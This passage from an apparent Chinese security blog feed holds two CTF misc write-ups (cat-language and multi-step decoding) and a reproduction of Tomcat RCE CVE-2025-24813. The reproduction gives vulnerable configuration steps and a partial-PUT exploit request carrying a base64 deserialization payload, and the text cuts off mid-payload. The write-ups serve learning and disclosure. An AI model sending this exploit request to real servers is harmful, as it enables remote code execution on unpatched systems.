class="line">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊</span><br></pre></td></tr></table></figure><p>看我用自学的猫语翻译喵喵喵~</p><p>工具地址：<a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a></p><p>成功拿到flag</p><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">CatCTF</span><span class="template-variable">&#123;d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Misc-真是阳间题</title>
      <link href="/2025/08/12/adworld-misc-yangjianti/"/>
      <url>/2025/08/12/adworld-misc-yangjianti/</url>
      
        <content type="html"><![CDATA[<p>附件内容：</p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">艾尔登法环正式发售在即，迫不及待的mjj身上好像有蚂蚁在爬，写下了一句谜语：</span><br><span class="line"><span class="number">3207357975641587136122466514425152961654613410728337142271750273124995105747053991640817066352343657398947248938255086358418100814441196784643527787764297</span></span><br><span class="line">谜底就是<span class="built_in">flag</span>，也是他给所有新生的祝福，希望大家享受解码的过程。</span><br></pre></td></tr></table></figure><p>先十进制转十六进制</p><p><a href="http://www.hiencode.com/jinzhi.html">CTF在线工具-ASCII与进制转换|任意进制转换|ASCII、2进制、8进制、10进制、16进制</a></p><p>得到十六进制编码后的内容</p><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">3d</span>3d3d3d513642475354334f4859464d37435a415450424f4454344348324d4e37434e36565a414f5a3358474859344b374b354144474e5045535<span class="number">54355495a49</span></span><br></pre></td></tr></table></figure><p>然后十六进制转字符串</p><p><a href="https://www.lddgo.net/string/hex">字符串HEX转换</a></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI</span><br></pre></td></tr></table></figure><p>字符串反转</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_string</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> text[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;字符串反转工具&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;输入 &#x27;quit&#x27; 退出&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        user_input = <span class="built_in">input</span>(<span class="string">&quot;\n请输入要反转的字符串: &quot;</span>).strip()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> user_input.lower() == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> user_input:</span><br><span class="line">            reversed_text = reverse_string(user_input)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;反转结果: <span class="subst">&#123;reversed_text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入有效的字符串&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>反转后结果：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>base32解码</p><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">FQARD</span><span class="template-variable">&#123;L0u_W0s_yp3_4_k4qrcp_0d_apwnr0&#125;</span></span><br></pre></td></tr></table></figure><p>凯撒以下，偏移量爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">if</span> char.islower() <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">            decrypted = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base - shift + <span class="number">26</span>) % <span class="number">26</span> + base)</span><br><span class="line">            result += decrypted</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += char</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        encrypted_text = <span class="built_in">input</span>(<span class="string">&quot;\n请输入要解密的文本: &quot;</span>).strip()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> encrypted_text.lower() == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> encrypted_text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n所有偏移量的解密结果:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">                decrypted = caesar_decrypt(encrypted_text, shift)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;偏移量 <span class="subst">&#123;shift:2d&#125;</span>: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入有效的文本&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">请输入要解密的文本</span><span class="punctuation">:</span> <span class="string">FQARD&#123;L0u_W0s_yp3_4_k4qrcp_0d_apwnr0&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">所有偏移量的解密结果</span><span class="punctuation">:</span></span><br><span class="line"><span class="attribute">偏移量  1</span><span class="punctuation">:</span> <span class="string">EPZQC&#123;K0t_V0r_xo3_4_j4pqbo_0c_zovmq0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  2</span><span class="punctuation">:</span> <span class="string">DOYPB&#123;J0s_U0q_wn3_4_i4opan_0b_ynulp0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  3</span><span class="punctuation">:</span> <span class="string">CNXOA&#123;I0r_T0p_vm3_4_h4nozm_0a_xmtko0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  4</span><span class="punctuation">:</span> <span class="string">BMWNZ&#123;H0q_S0o_ul3_4_g4mnyl_0z_wlsjn0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  5</span><span class="punctuation">:</span> <span class="string">ALVMY&#123;G0p_R0n_tk3_4_f4lmxk_0y_vkrim0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  6</span><span class="punctuation">:</span> <span class="string">ZKULX&#123;F0o_Q0m_sj3_4_e4klwj_0x_ujqhl0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  7</span><span class="punctuation">:</span> <span class="string">YJTKW&#123;E0n_P0l_ri3_4_d4jkvi_0w_tipgk0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  8</span><span class="punctuation">:</span> <span class="string">XISJV&#123;D0m_O0k_qh3_4_c4ijuh_0v_shofj0&#125;</span></span><br><span class="line"><span class="attribute">偏移量  9</span><span class="punctuation">:</span> <span class="string">WHRIU&#123;C0l_N0j_pg3_4_b4hitg_0u_rgnei0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 10</span><span class="punctuation">:</span> <span class="string">VGQHT&#123;B0k_M0i_of3_4_a4ghsf_0t_qfmdh0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 11</span><span class="punctuation">:</span> <span class="string">UFPGS&#123;A0j_L0h_ne3_4_z4fgre_0s_pelcg0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 12</span><span class="punctuation">:</span> <span class="string">TEOFR&#123;Z0i_K0g_md3_4_y4efqd_0r_odkbf0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 13</span><span class="punctuation">:</span> <span class="string">SDNEQ&#123;Y0h_J0f_lc3_4_x4depc_0q_ncjae0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 14</span><span class="punctuation">:</span> <span class="string">RCMDP&#123;X0g_I0e_kb3_4_w4cdob_0p_mbizd0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 15</span><span class="punctuation">:</span> <span class="string">QBLCO&#123;W0f_H0d_ja3_4_v4bcna_0o_lahyc0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 16</span><span class="punctuation">:</span> <span class="string">PAKBN&#123;V0e_G0c_iz3_4_u4abmz_0n_kzgxb0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 17</span><span class="punctuation">:</span> <span class="string">OZJAM&#123;U0d_F0b_hy3_4_t4zaly_0m_jyfwa0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 18</span><span class="punctuation">:</span> <span class="string">NYIZL&#123;T0c_E0a_gx3_4_s4yzkx_0l_ixevz0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 19</span><span class="punctuation">:</span> <span class="string">MXHYK&#123;S0b_D0z_fw3_4_r4xyjw_0k_hwduy0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 20</span><span class="punctuation">:</span> <span class="string">LWGXJ&#123;R0a_C0y_ev3_4_q4wxiv_0j_gvctx0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 21</span><span class="punctuation">:</span> <span class="string">KVFWI&#123;Q0z_B0x_du3_4_p4vwhu_0i_fubsw0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 22</span><span class="punctuation">:</span> <span class="string">JUEVH&#123;P0y_A0w_ct3_4_o4uvgt_0h_etarv0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 23</span><span class="punctuation">:</span> <span class="string">ITDUG&#123;O0x_Z0v_bs3_4_n4tufs_0g_dszqu0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 24</span><span class="punctuation">:</span> <span class="string">HSCTF&#123;N0w_Y0u_ar3_4_m4ster_0f_crypt0&#125;</span></span><br><span class="line"><span class="attribute">偏移量 25</span><span class="punctuation">:</span> <span class="string">GRBSE&#123;M0v_X0t_zq3_4_l4rsdq_0e_bqxos0&#125;</span></span><br></pre></td></tr></table></figure><p>flag-&gt; <code>HSCTF&#123;N0w_Y0u_ar3_4_m4ster_0f_crypt0&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat RCE漏洞CVE-2025-24813复现</title>
      <link href="/2025/08/05/CVE-2025-24813-Tomcat-RCE/"/>
      <url>/2025/08/05/CVE-2025-24813-Tomcat-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="JAVA序列化与反序列化简述"><a href="#JAVA序列化与反序列化简述" class="headerlink" title="JAVA序列化与反序列化简述"></a>JAVA序列化与反序列化简述</h2><p>JAVA序列化是JAVA语言内置的一种对象持久化的机制，它可以将JAVA对象转化为字节流，以便于在网络中进行传输，或者保存到本地进行持久化（类似于PHP序列化）。反序列化则是序列化的逆过程，将字节流转化回JAVA对象。</p><p>序列化过程中，JAVA会将对象的类型、属性以及属性的值等信息一起保存下来，反序列化时，JAVA会根据这些信息重新构建出原来的对象。这就意味着，<strong>如果一个恶意用户能够控制序列化的字节流，那么他就有可能在反序列化时构造出含有恶意代码的对象，从而引发安全问题</strong>。</p><h2 id="JAVA反序列化漏洞的常见产生原因"><a href="#JAVA反序列化漏洞的常见产生原因" class="headerlink" title="JAVA反序列化漏洞的常见产生原因"></a>JAVA反序列化漏洞的常见产生原因</h2><p>JAVA反序列化漏洞的产生，主要是因为在反序列化时，JAVA会自动调用对象的readObject()方法，而这个方法通常是开发者自定义的，如果开发者在这个方法中执行了不安全的操作，就可能产生安全漏洞。</p><p>另一种常见的情况是，JAVA的某些内置类库，如Apache Commons Collections、JAVA RMI等，在反序列化时，会自动执行某些可以被恶意利用的方法。如果应用使用了这些类库，并且没有对反序列化的输入进行有效的限制，那么就可能产生反序列化漏洞。</p><h2 id="常规反序列化漏洞的发现与利用技术"><a href="#常规反序列化漏洞的发现与利用技术" class="headerlink" title="常规反序列化漏洞的发现与利用技术"></a>常规反序列化漏洞的发现与利用技术</h2><p>在实际的安全测试中，发现JAVA反序列化漏洞，通常需要通过静态代码分析、动态测试、模糊测试等手段。其中，静态代码分析是直接阅读和理解源代码，找出可能存在问题的地方；动态测试是在运行应用的过程中，对其进行观察和调试，寻找可能的漏洞；模糊测试是对应用的输入进行大量的随机化修改，试图触发未知的漏洞。</p><p>利用JAVA反序列化漏洞，通常需要构造特殊的序列化字节流，这个字节流在反序列化时，会产生恶意的效果。这需要对JAVA序列化的格式有深入的理解，同时还需要对目标应用的具体情况有足够的了解。</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>该漏洞的核心在于 Tomcat 在处理不完整PUT请求上传时，会使用了一个基于用户提供的文件名和路径生成的临时文件，且文件路径中的分隔符<code>/</code>会被转换为<code>.</code>。例如：访问<code>/xxxxx/session</code>会被解析为<code>.xxxxx.session</code></p><p>因此整个漏洞的利用过程为：</p><p>Tomcat的File会话存储默认路径同样位于：<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code></p><p>当存在反序列化利用链时，可以上传包含恶意序列化数据的文件</p><p>通过设置<code>JSESSIONID=.xxxxx</code>来触发漏洞</p><p>若同时满足以下条件，攻击者可执行任意代码：</p><ol><li>默认 Servlet 启用了写权限（默认禁用）</li><li>启用了部分PUT请求支持（默认启用）</li><li>应用程序使用 Tomcat 的基于文件的会话持久化（默认存储位置）</li><li>应用程序包含可被利用于反序列化攻击的库</li></ol><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul><li><p>Apache Tomcat 11.0.0-M1 至 11.0.2</p></li><li><p>Apache Tomcat 10.1.0-M1 至 10.1.34</p></li><li><p>Apache Tomcat 9.0.0-M1 至 9.0.98</p></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>以Tomcat 9.0.98为例：</p><p>Tomcat 9.0.98下载地址<em><a href="https://github.com/apache/tomcat/releases/tag/9.0.98">https://github.com/apache/tomcat/releases/tag/9.0.98</a></em></p><p><strong>条件一</strong>：在<code>conf/web.xml</code>中，将<code>DefaultServlet</code>的<code>readonly</code>配置为<code>false</code>，启用写入功能</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/cve-tomcat-rce-1.png" alt="图一展示了将DefaultServlet的readonly配置为false以启用写入功能"></p><p><strong>条件二</strong>：PUT默认开启</p><p><strong>条件三</strong>：在<code>conf/context.xml</code>中，开启File文件会话存储</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/cve-tomcat-rce-2.png" alt="图二展示了在conf&#x2F;context.xml中开启File文件会话存储"></p><p><strong>条件四</strong>：下载<code>commons-collections-3.2.1.jar</code>, 将该<code>jar</code>包放入<code>webapps\ROOT\WEB-INF\lib</code>目录下，如果没有这个目录就创建一个</p><p>commons-collections-3.2.1.jar下载地址：</p><p><em><a href="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar">https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1.jar</a></em></p><p><img src="/images/cve-tomcat-rce-3.png" alt="图三展示了下载commons-collections-3.2.1.jar并将该jar包放入webapps\ROOT\WEB-INF\lib目录下"></p><p>环境搭建好后就点击bin目录下的<code>startup.bat</code>(For Windows)或者<code>startup.sh</code>(For Linux)启动环境即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zhailin@DESKTOP-7U7Q35J:~/Vuln-Analysis/CVE-2025-24813/apache-tomcat-9.0.98/bin$ <span class="built_in">sudo</span> <span class="built_in">chmod</span> +x startup.sh</span><br><span class="line">zhailin@DESKTOP-7U7Q35J:~/Vuln-Analysis/CVE-2025-24813/apache-tomcat-9.0.98/bin$ <span class="built_in">sudo</span> <span class="built_in">chmod</span> +x catalina.sh</span><br><span class="line">zhailin@DESKTOP-7U7Q35J:~/Vuln-Analysis/CVE-2025-24813/apache-tomcat-9.0.98/bin$ ./startup.sh</span><br></pre></td></tr></table></figure><p>之后访问<code>ip:8080</code>(一般默认是8080)</p><p><img src="/images/cve-tomcat-rce-4.png" alt="图四展示了通过ip:8080访问搭建起来的服务"></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先在【Yso-Java Hack】模块快速生成一个利用payload：</p><p><img src="/images/cve-tomcat-rce-5.png" alt="图五展示了在Yakit下Yso-Java HacK模块中配置相关参数以快速生成一个利用payload"></p><p>使用以下数据包上传，需要注意Range的分块值需要与Length保持一致，且大于当前文件的长度。</p><figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">PUT <span class="symbol">/xxxxx/session</span> HTTP<span class="symbol">/1.1</span>  </span><br><span class="line"><span class="params">Host:</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>  </span><br><span class="line"><span class="params">Content-Length:</span> <span class="number">1000</span>  </span><br><span class="line"><span class="params">Content-Range:</span> bytes <span class="number">0</span><span class="operator">-</span><span class="number">1000</span><span class="symbol">/1200</span>  </span><br><span class="line"></span><br><span class="line">&#123;&#123;反序列化文件内容)&#125;&#125;</span><br></pre></td></tr></table></figure><p>反序列化的内容填我们生成出来的payload，由于我们的payload是二进制转base64的，于是我们在第一个包中还需要进行base64解码</p><p><img src="/images/cve-tomcat-rce-6.png" alt="图六展示了在数据包中添加base64解码"></p><p>以下是第一个数据包内容：</p><figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">PUT /xxxxx/session HTTP/1.1  </span></span><br><span class="line"><span class="language-xml">Host: 172.23.218.80:8080</span></span><br><span class="line"><span class="language-xml">Content-Length: 1000  </span></span><br><span class="line"><span class="language-xml">Content-Range: bytes 0-1000/1200  </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;base<span class="number">64</span>dec(rO<span class="number">0</span>ABXNyACLBqsGhwbbBocCuwbXBtMGpwazArsGIwaHBs<span class="number">8</span>GowY<span class="number">3</span>BocGwBQfawcMWYNEDAAJGABTBrMGvwaHBpMGGwaHBo<span class="number">8</span>G<span class="number">0</span>wa/BskkAEsG<span class="number">0</span>wajBssGlwbPBqMGvwazBpHhwP<span class="number">0</span>AAAAAAAAx<span class="number">3</span>CAAAABAAAAABc<span class="number">3</span>IAaMGvwbLBp<span class="number">8</span>CuwaHBsMGhwaPBqMGlwK<span class="number">7</span>Bo<span class="number">8</span>Gvwa<span class="number">3</span>BrcGvwa<span class="number">7</span>Bs<span class="number">8</span>CuwaPBr<span class="number">8</span>GswazBpcGjwbTBqcGvwa<span class="number">7</span>Bs<span class="number">8</span>CuwavBpcG<span class="number">5</span>wbbBocGswbXBpcCuwZTBqcGlwaTBjcGhwbDBhcGuwbTBssG<span class="number">5</span>iq<span class="number">3</span>SmznBH<span class="number">9</span>sCAAJMAAbBq<span class="number">8</span>Glwbl<span class="number">0</span>ACTBjMGqwaHBtsGhwK/BrMGhwa<span class="number">7</span>Bp<span class="number">8</span>CvwY/BosGqwaXBo<span class="number">8</span>G<span class="number">0</span>wLtMAAbBrcGhwbB<span class="number">0</span>AB<span class="number">7</span>BjMGqwaHBtsGhwK/BtcG<span class="number">0</span>wanBrMCvwY<span class="number">3</span>BocGwwLt<span class="number">4</span>cHNyAHTBo<span class="number">8</span>Gvwa<span class="number">3</span>ArsGzwbXBrsCuwa/BssGnwK<span class="number">7</span>BocGwwaHBo<span class="number">8</span>GowaXArsG<span class="number">4</span>waHBrMGhwa<span class="number">7</span>ArsGpwa<span class="number">7</span>BtMGlwbLBrsGhwazArsG<span class="number">4</span>wbPBrMG<span class="number">0</span>waPArsG<span class="number">0</span>wbLBocG<span class="number">4</span>wK<span class="number">7</span>BlMGlwa<span class="number">3</span>BsMGswaHBtMGlwbPBicGtwbDBrAlXT<span class="number">8</span>FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG<span class="number">1</span>wa<span class="number">3</span>BosGlwbJJABzBn<span class="number">8</span>G<span class="number">0</span>wbLBocGuwbPBrMGlwbTBicGuwaTBpcG<span class="number">4</span>WwAUwZ/BosG<span class="number">5</span>wbTBpcGjwa/BpMGlwbN<span class="number">0</span>AAbBm<span class="number">8</span>GbwYJbAAzBn<span class="number">8</span>GjwazBocGzwbN<span class="number">0</span>ACTBm<span class="number">8</span>GMwarBocG<span class="number">2</span>waHAr<span class="number">8</span>GswaHBrsGnwK/Bg<span class="number">8</span>GswaHBs<span class="number">8</span>GzwLtMAArBn<span class="number">8</span>GuwaHBrcGldAAkwYzBqsGhwbbBocCvwazBocGuwafAr<span class="number">8</span>GTwbTBssGpwa<span class="number">7</span>Bp<span class="number">8</span>C<span class="number">7</span>TAAiwZ/Br<span class="number">8</span>G<span class="number">1</span>wbTBsMG<span class="number">1</span>wbTBkMGywa/BsMGlwbLBtMGpwaXBs<span class="number">3</span>QALMGMwarBocG<span class="number">2</span>waHAr<span class="number">8</span>G<span class="number">1</span>wbTBqcGswK/BkMGywa/BsMGlwbLBtMGpwaXBs<span class="number">8</span>C<span class="number">7</span>eHAAAAAA/////<span class="number">3</span>VyAAbBm<span class="number">8</span>GbwYJL/RkVZ<span class="number">2</span>fbNwIAAHhwAAAAAnVyAATBm<span class="number">8</span>GCrPMX+AYIVOACAAB<span class="number">4</span>cAAABATK/rq+AAAANABECgAQACUIACYJACcAKAgAKQoABgAqBwArCAAsCAAtCAAdCAAuCgAvADAKAC<span class="number">8</span>AMQcAMgoADQAzBwA<span class="number">0</span>BwA<span class="number">1</span>AQAGPGluaXQ+AQADKClWAQAEQ<span class="number">29</span>kZQEAD<span class="number">0</span>xpbmVOdW<span class="number">1</span>iZXJUYWJsZQEAEkxvY<span class="number">2</span>FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMcGF<span class="number">5</span>bG<span class="number">9</span>hZC<span class="number">9</span>SdW<span class="number">50</span>aW<span class="number">1</span>lRXhlYzsBAAg<span class="number">8</span>Y<span class="number">2</span>xpbml<span class="number">0</span>PgEABHZhcjEBABNbTGphdmEvbGFuZy<span class="number">9</span>TdHJpbmc<span class="number">7</span>AQAEdmFyMwEAFUxqYXZhL<span class="number">2</span>lvL<span class="number">0</span>lPRXhjZXB<span class="number">0</span>aW<span class="number">9</span>uOwEAA<span class="number">2</span>NtZAEAEkxqYXZhL<span class="number">2</span>xhbmcvU<span class="number">3</span>RyaW<span class="number">5</span>nOwEADVN<span class="number">0</span>YWNrTWFwVGFibGUHACsHABoHADIBAApTb<span class="number">3</span>VyY<span class="number">2</span>VGaWxlAQAQUnVudGltZUV<span class="number">4</span>ZWMuamF<span class="number">2</span>YQwAEQASAQAEY<span class="number">2</span>FsYwcANgwANwAeAQABLwwAOAA<span class="number">5</span>AQAQamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">1</span>N<span class="number">0</span>cmluZwEABy<span class="number">9</span>iaW<span class="number">4</span>vc<span class="number">2</span>gBAAItYwEAAi<span class="number">9</span>DBwA<span class="number">6</span>DAA<span class="number">7</span>ADwMAD<span class="number">0</span>APgEAE<span class="number">2</span>phdmEvaW<span class="number">8</span>vSU<span class="number">9</span>FeGNlcHRpb<span class="number">24</span>MAD<span class="number">8</span>AEgEACElqYkVheG<span class="number">5</span>EAQAQamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">09</span>iamVjdAEADGphdmEvaW<span class="number">8</span>vRmlsZQEACXNlcGFyYXRvcgEABmVxdWFscwEAFShMamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">09</span>iamVjdDspWgEAEWphdmEvbGFuZy<span class="number">9</span>SdW<span class="number">50</span>aW<span class="number">1</span>lAQAKZ<span class="number">2</span>V<span class="number">0</span>UnVudGltZQEAFSgpTGphdmEvbGFuZy<span class="number">9</span>SdW<span class="number">50</span>aW<span class="number">1</span>lOwEABGV<span class="number">4</span>ZWMBACgoW<span class="number">0</span>xqYXZhL<span class="number">2</span>xhbmcvU<span class="number">3</span>RyaW<span class="number">5</span>nOylMamF<span class="number">2</span>YS<span class="number">9</span>sYW<span class="number">5</span>nL<span class="number">1</span>Byb<span class="number">2</span>Nlc<span class="number">3</span>M<span class="number">7</span>AQAPcHJpbnRTdGFja<span class="number">1</span>RyYWNlAQBAY<span class="number">29</span>tL<span class="number">3</span>N<span class="number">1</span>bi<span class="number">9</span>vcmcvYXBhY<span class="number">2</span>hlL<span class="number">3</span>hhbGFuL<span class="number">2</span>ludGVybmFsL<span class="number">3</span>hzbHRjL<span class="number">3</span>J<span class="number">1</span>bnRpbWUvQWJzdHJhY<span class="number">3</span>RUcmFuc<span class="number">2</span>xldAcAQAwAEQASCgBBAEIAIQAPAEEAAAAAAAIAAQARABIAAQATAAAALwABAAEAAAAFKrcAQ<span class="number">7</span>EAAAACABQAAAAGAAEAAAAFABUAAAAMAAEAAAAFABYAFwAAAAgAGAASAAEAEwAAANMABAADAAAASBICS<span class="number">7</span>IAAxIEtgAFmQAZBr<span class="number">0</span>ABlkDEgdTWQQSCFNZBSpTTKcAFga<span class="number">9</span>AAZZAxIJU<span class="number">1</span>kEEgpTWQUqU<span class="number">0</span>y<span class="number">4</span>AAsrtgAMV<span class="number">6</span>cACE<span class="number">0</span>stgAOsQABADcAPwBCAA<span class="number">0</span>AAwAUAAAAJgAJAAAABwADAAkADgAKACQADAA<span class="number">3</span>AA<span 